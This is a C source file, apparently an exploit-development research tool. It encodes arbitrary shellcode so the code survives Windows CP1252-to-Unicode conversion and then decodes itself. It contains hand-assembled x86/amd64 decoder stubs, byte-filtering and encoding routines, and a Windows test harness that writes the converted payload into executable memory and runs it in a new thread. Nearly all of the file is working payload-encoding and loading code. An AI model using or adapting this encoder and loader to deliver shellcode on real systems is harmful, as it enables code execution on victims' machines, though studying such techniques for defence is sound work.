//
// odzhan, june 2020
//

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef union _w64_t {
    u8   b[8];
    u16  h[4];
    u32  w[2];
    u64  q;
    void *p;
} w64_t;

#define CP1252_KEY  0x4D
#define CP1252_FILE "cp1252.bin"
#define MAX_ADDR 6

// This decoder is compatible with x86 and amd64
#define CP1252_DECODER_SIZE 40

char CP1252_DECODER[] = {
  /* 0000 */ "\xeb\x21"             /* jmp   0x23     */
  /* 0002 */ "\xac"                 /* lodsb          */
  /* 0003 */ "\xfe\xc8"             /* dec   al       */
  /* 0005 */ "\x75\x04"             /* jne   0xb      */
  /* 0007 */ "\xac"                 /* lodsb          */
  /* 0008 */ "\xac"                 /* lodsb          */
  /* 0009 */ "\x34\x4d"             /* xor   al, 0x4d */
  /* 000B */ "\xaa"                 /* stosb          */
  /* 000C */ "\xac"                 /* lodsb          */
  /* 000D */ "\xe2\xf3"             /* loop  2        */
  /* 000F */ "\xc3"                 /* ret            */
  
  /* 0010 */ "\x5e"                 /* pop   rsi      */
  /* 0011 */ "\x6a\x01"             /* push  1        */
  /* 0013 */ "\x54"                 /* push  rsp      */
  /* 0014 */ "\x5f"                 /* pop   rdi      */
  /* 0015 */ "\x6a\x04"             /* push  4        */
  /* 0017 */ "\x59"                 /* pop   rcx      */
  /* 0018 */ "\xe8\xe5\xff\xff\xff" /* call  2        */
  /* 001D */ "\x59"                 /* pop   rcx      */
  /* 001E */ "\x56"                 /* push  rsi      */
  /* 001F */ "\x5f"                 /* pop   rdi      */
  /* 0020 */ "\x56"                 /* push  rsi      */
  /* 0021 */ "\xeb\xdf"             /* jmp   2        */
  /* 0023 */ "\xe8\xe8\xff\xff\xff" /* call  0x10     */
};

// with the current size of decoder, this takes  up 380 bytes
// store a 32-bit word in buffer EDI/RDI holds
#define STORE_WORD_SIZE 38

char STORE_WORD[] = {
  /* 0000 */ "\x68\x00\x03\x00\x01" /* push  0x1000300       */
  /* 0005 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0008 */ "\x54"                 /* push  esp             */
  /* 0009 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 000C */ "\x58"                 /* pop   eax             */
  /* 000D */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0010 */ "\xc1\x00\x08"         /* rol   dword [eax], 8  */
  /* 0013 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0016 */ "\x58"                 /* pop   eax             */
  /* 0017 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 001A */ "\x35\x00\x02\x00\x04" /* xor   eax, 0x4000200  */
  /* 001F */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0022 */ "\xab"                 /* stosd                 */
  /* 0023 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
};

// Initialize RBP for writing
#define CP1252_PROLOG_SIZE 4

char CP1252_PROLOG[] = {
  /* 0000 */ "\xc8\x00\x01\x00"     /* enter 0x100, 0        */
};

// Allocate 64-bit buffer on stack and place address in RDI for writing
#define STORE_ADDR_SIZE 10

char STORE_ADDR[] = {
  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x4d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Store address on the stack in RDI
#define POP_DI_SIZE 4

char POP_DI[] = {
  /* 0000 */ "\x5f"                 /* pop   rdi             */
  /* 0001 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Store address in RDI on the stack
#define PUSH_DI_SIZE 4

char PUSH_DI[] = {
  /* 0000 */ "\x57"                 /* push  rdi             */
  /* 0001 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

#define CP1252_EPILOG_SIZE 36

char CP1252_EPILOG[] = {
  /* 0000 */ "\x5a"                 /* pop  rdx              */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0004 */ "\x55"                 /* push rbp              */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0008 */ "\x54"                 /* push rsp              */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 000C */ "\x5f"                 /* pop  rdi              */
  /* 000D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0010 */ "\xb8\x00\x08\x00\x4d" /* mov  eax, 0x4d000800  */
  /* 0015 */ "\x00\x27"             /* add  byte [rdi], ah   */
  /* 0017 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 001A */ "\x5c"                 /* pop  rsp              */
  /* 001B */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 001E */ "\x52"                 /* push rdx              */
  /* 001F */ "\x00\x45\x00"         /* add  byte [rbp], al   */
  /* 0022 */ "\xc3"                 /* ret                   */
  /* 0024 */ "\x00"
};

// only useful for CP_ACP codepage
static
int is_cp1252_allowed(int ch) {
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

// determines if byte is compatible with CP1252 encoding
// and the CP1252 decoder using escape codes
static
int is_decoder_allowed(u8 ch) {
    // check for null byte and escape code
    if(ch == 0 || ch == 1) return 0;
    
    return is_cp1252_allowed(ch);
}

static
int cp1252_encode_data(
  void *outbuf, int ofs, 
  const void *inbuf, int inlen) 
{
    u8  c, *in=NULL, *out=NULL;
    int outlen = 0;
    
    in  = (u8*)inbuf;
    out = (u8*)outbuf + ofs;
    
    while(inlen--) {
      // read byte
      c = *in++;
      // is the result compatible with CP1252 decoder?
      if(!is_decoder_allowed(c + 1)) {
        // no. write escape sequence
        if(outbuf != NULL) *out++ = 1;
        outlen++;
        // XOR the result with 8-bit key
        if(outbuf != NULL) *out++ = c ^ CP1252_KEY;
        outlen++;
      } else {
        // yes. save byte plus 1
        if(outbuf != NULL) *out++ = c + 1;  
        outlen++;
      }
    }
    // return number of bytes processed
    return outlen;
}

// encode the contents of a file that when converted to the CP1252
// character set can be decoded using the CP1252_DECODER
static
void *cp1252_encode_file(const char *infile, int *outlen) {
    struct stat fs;
    FILE        *in;
    int         inlen, buflen;
    void        *inbuf=NULL, *outbuf=NULL;
     
    if(stat(infile, &fs)) return NULL;
    in = fopen(infile, "rb");
    if(in == NULL) return NULL;
    inlen = fs.st_size;
    inbuf = malloc(inlen);
    
    if(inbuf != NULL) {
      // read the data to encode
      fread(inbuf, sizeof(char), inlen, in);
      
      // calculate the size of memory required
      buflen = cp1252_encode_data(NULL, 0, &inlen, sizeof(u32));
      buflen += cp1252_encode_data(NULL, buflen, inbuf, inlen);
      
      if(buflen != 0) {
        // add space for decoder
        buflen += (CP1252_DECODER_SIZE / 2);
        // allocate memory
        outbuf = malloc(buflen);
        if(outbuf != NULL) {
          // initialize to key
          memset(outbuf, CP1252_KEY, buflen);
          *outlen = (CP1252_DECODER_SIZE / 2);
          // encode, then store the length and data
          *outlen += cp1252_encode_data(
            outbuf, *outlen, 
            &inlen, sizeof(u32));
            
          *outlen += cp1252_encode_data(
            outbuf, *outlen, 
            inbuf, inlen);
        }
      }
      free(inbuf);
    }
    fclose(in);
    
    return outbuf;
}

// Convert executable code to CP1252 compatible code.
// The code will generate the original before executing.
// 
static
int cp1252_generate_decoder(
  const void *addrbuf, void *outbuf, 
  const char *inbuf, u32 inlen) 
{
    int     i, max_addr;
    u8 *out = (u8*)outbuf, 
            *in = (u8*)inbuf,
            *addr = (u8*)addrbuf;
    
    memcpy(out, CP1252_PROLOG, CP1252_PROLOG_SIZE);
    out += CP1252_PROLOG_SIZE;
    
    // copy the destination address to DI
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;
    
    // the max address for virtual memory on 
    // windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF

    // ***********************************
    // store address
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr[i];
    
      // if not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // pop address into DI
    memcpy(out, POP_DI, POP_DI_SIZE);
    out += POP_DI_SIZE;
    
    // save address on the stack
    memcpy(out, PUSH_DI, PUSH_DI_SIZE);
    out += PUSH_DI_SIZE;
    
    // ***********************************
    // copy the code to buffer
    for(i=0; i<inlen; i++) {
      // load a byte
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = in[i];
      // subtract key for every 2 bytes
      if((i & 1)==0) out[2] -= CP1252_KEY;
    
      // if disallowed for CP1252
      if(!is_cp1252_allowed(out[2])) {
        // add 32
        out[2] += 32;
        // and subtract 32 from the byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // add epilog code
    memcpy(out, CP1252_EPILOG, CP1252_EPILOG_SIZE);
    out += CP1252_EPILOG_SIZE;
    
    // return length of constructed code
    return (int)(out - (u8*)outbuf); 
}

static
int cp1252_max_loader_size(int inlen) {
    int outlen;
    
    outlen = CP1252_PROLOG_SIZE + STORE_ADDR_SIZE;
    outlen += (LOAD_BYTE_SIZE * (inlen + MAX_ADDR));
    outlen += (SUB_BYTE_SIZE * (inlen + MAX_ADDR));
    outlen += (STORE_BYTE_SIZE * (inlen + MAX_ADDR));
    outlen += POP_DI_SIZE;
    outlen += PUSH_DI_SIZE;
    outlen += CP1252_EPILOG_SIZE;
    
    // align up by 2 bytes (it should be already anyway)
    return (outlen + 1) & -2;
}

// Create a CP1252 compatible loader
static
void *cp1252_build_loader(w64_t *addr, int dslen, int *cslen) {
    void  *outbuf = NULL;
    int   maxlen, outlen;
    w64_t ofs;
    
    maxlen = cp1252_max_loader_size(CP1252_DECODER_SIZE);
    outbuf = malloc(maxlen);
    
    if(outbuf != NULL) {
      memset(outbuf, CP1252_KEY, maxlen);
      
      // calculate offset of where loader should be stored
      ofs.q = addr->q + maxlen;
 
      *cslen = cp1252_generate_decoder(
        &ofs.p, outbuf, CP1252_DECODER, CP1252_DECODER_SIZE);

      *cslen = maxlen;
    }
    return outbuf;
}

// you can only test this on Windows
#ifdef TEST
#include <windows.h>

int main(int argc, char **argv) {
    int     i, dslen, cslen, vmlen, uni_len, asc_len;
    void    *ds, *cs, *code;
    w64_t   vm;
    u8 *out, *ptr, *asc;
    HANDLE  ht;
    
    // convert the user-supplied shellcode to CP1252 encoded data
    if((ds = cp1252_encode_file(argv[1], &dslen)) != NULL) {
      vmlen = dslen + 0xFFFF;
      
      vm.p = VirtualAlloc(
        NULL, vmlen, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      // convert the CP1252 decoder to CP1252 compatible code
      // we need a destination address for this
      if((cs = cp1252_build_loader(&vm, dslen, &cslen))) {
        
        FILE *bin = fopen("unicode.bin", "wb");
        fwrite(cs, 1, cslen, bin);
        fclose(bin);
        
        // convert the loader to ascii
        asc_len = cslen;
        asc_len += dslen;
        
        out = asc = malloc(asc_len + 1);
        ptr = (u8*)cs;
        for(i=0; i<cslen; i+=2) {
          *out++ = *ptr++;
          ptr++;
        }
        // copy the encoded data
        memcpy(out, ds, dslen);
        
        bin = fopen("code.bin", "wb");
        fwrite(asc, 1, asc_len, bin);
        fclose(bin);
        
        // convert to unicode using CP_ACP
        uni_len = MultiByteToWideChar(CP_ACP, 0, asc, asc_len, (LPWSTR)vm.p, vmlen);
        
        bin = fopen("convert.bin", "wb");
        fwrite(vm.p, 1, uni_len, bin);
        fclose(bin);
        
        printf("CP1252 encoded length : %i\n", uni_len);
        printf("Thread will execute at %p\n", vm.p);
        getchar();
        
        ht = CreateThread(NULL, 0, vm.p, NULL, 0, NULL);
        WaitForSingleObject(ht, INFINITE);
        
        /**
        // copy the loader
        out = (u8*)vm.p;
        CopyMemory(out, cs, cslen);
        out += cslen;
        
        // copy the data as CP1252
        ptr = (u8*)ds;
        for(i=0; i<dslen; i++) {
          *out++ = *ptr++;
          *out++ = 0;
        }
        printf("Thread will execute at %p\n", vm.p);
        getchar();
        
        ht = CreateThread(NULL, 0, vm.p, NULL, 0, NULL);
        WaitForSingleObject(ht, INFINITE);*/
        
        free(cs);
      }
      free(ds);
      VirtualFree(vm.p, 0,  MEM_RELEASE);
    }
    return 0;
}

#endif